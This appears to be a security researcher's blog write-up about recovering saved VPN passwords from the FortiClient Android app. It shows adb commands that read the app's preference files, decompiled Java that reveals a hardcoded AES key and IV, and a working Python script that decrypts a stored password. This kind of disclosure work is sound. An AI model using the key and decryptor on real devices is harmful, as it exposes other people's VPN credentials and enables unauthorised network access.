---
slug: forticlient-vpn
title: FortiClient VPN - Credential Exposure
authors: [wesam]
date: 2026-05-02
---


{/* truncate */}

### Objective

- The app allows creating VPN profiles with username and password. noticed that credentials were **pre-filled** after creation — indicating they are **stored somewhere on the device**.
- The goal is to find the stored credentials in the FortiClient VPN Android app.

### Steps

- Started with Checking common storage locations like **`SharedPreferences`**, the most common insecure storage location:
    
    ```bash
    adb shell
    cd /data/data/com.fortinet.forticlient/shared_prefs
    ls
    # app-settings.xml  profile-1.xml  profile-2.xml  profile-3.xml  webfilter.xml
    
    cat profile-3.xml
    ```
    
- **Found**:
    
    ```xml
    <map>
        <string name="profile.title">Wesam</string>
        <string name="ssl.user">WEsaaaam</string>
        <string name="ssl.resu">1B14ABF4142EC689FFDAD21D1A7DE0E6</string>
        <string name="profile.type">ssl</string>
    </map>
    ```
    
    - `ssl.user` = username in plaintext
    - `ssl.resu` = password — looks encrypted (hex string)
- I Wanted to trace the encryption in source code so I decompiled the APK with JADX and searched for `ssl.resu` to understand how the password is stored.
    
    ```java
    public static void e(SharedPreferences sharedPreferences, String str) {
        SharedPreferences.Editor editorEdit = sharedPreferences.edit();
        editorEdit.putString("ssl.resu", cu.n(str)); // password goes through cu.n() first
        editorEdit.apply();
    }
    ```
    
- The password (`str`) is **not stored directly,** it's passed through `cu.n()` first, then the result is saved under the key `ssl.resu`. This means `cu.n()` is the encryption function.
- Lets understand the encryption function n
    
    ```java
    private static final String KEY = "FoRtInEt!AnDrOiD"; // hardcoded key
    
    public static String n(String str) {
    
        // Step 1: Define the IV (Initialization Vector)
        IvParameterSpec ivParameterSpec = new IvParameterSpec(
            new byte[]{117,122,39,67,114,124,115,44,113,116,124,123,58,89,118,94}
        );
    
        // Step 2: Build the AES key from the hardcoded string
        SecretKeySpec secretKeySpec = new SecretKeySpec(KEY.getBytes(), "AES");
    
        // Step 3: Create the cipher with AES/CBC/PKCS5Padding
        Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
    
        // Step 4: Initialize cipher in ENCRYPT mode (mode 1 = encrypt, mode 2 = decrypt)
        cipher.init(1, secretKeySpec, ivParameterSpec);
    
        // Step 5: Encrypt the password bytes
        byte[] encrypted = cipher.doFinal(str.getBytes());
    
        // Step 6: Convert encrypted bytes → HEX string for storage
        StringBuffer stringBuffer = new StringBuffer();
        for (byte b : encrypted) {
            String hexString = Integer.toHexString(b & 255);
            if (1 == hexString.length()) {
                hexString = "0" + hexString; // pad single chars with 0
            }
            stringBuffer.append(hexString.toUpperCase(Locale.ENGLISH));
        }
        return stringBuffer.toString(); // returns: "1B14ABF4142EC689FFDAD21D1A7DE0E6"
    }
    ```
    
    - From the code, Algorithm used is **AES/CBC/PKCS5Padding AES encryption in CBC mode.**
    - **key is hardcoded `FoRtInEt!AnDrOiD`**
    - **IV 16 bytes needed for CBC mode**
    
    <aside>
    💡
    
    Why is this a vulnerability?
    
    - AES itself is strong, but the implementation is fatally flawed:
    - Hardcoded KEY + Hardcoded IV + Decompilable APK Anyone can decrypt any password stored by this app
    </aside>
    
- Since we have the key, IV, and algorithm — decryption is straightforward. We just run the same process **in reverse this is a simple script**
    
    ```python
    from Crypto.Cipher import AES
    import binascii
    
    # exact same key and IV from the decompiled code
    KEY = "FoRtInEt!AnDrOiD"
    IV  = bytes([117, 122, 39, 67, 114, 124, 115, 44,
                 113, 116, 124, 123, 58,  89,  118, 94])
    
    # the encrypted value from shared_prefs/profile-3.xml
    encrypted_hex = "1B14ABF4142EC689FFDAD21D1A7DE0E6"
    
    # Step 1: convert hex string back to bytes
    encrypted_bytes = binascii.unhexlify(encrypted_hex)
    
    # Step 2: create cipher in DECRYPT mode
    cipher = AES.new(KEY.encode(), AES.MODE_CBC, IV)
    
    # Step 3: decrypt
    decrypted = cipher.decrypt(encrypted_bytes)
    
    # Step 4: remove PKCS5 padding and decode to string
    password = decrypted.rstrip(b'\x00').decode('utf-8', errors='ignore')
    print("Password:", password)
    ```
    
- After running this script I got the password in plain text
    
    ```bash
    python3 script.py       
    ## Password: HiThis IsWesam
    ```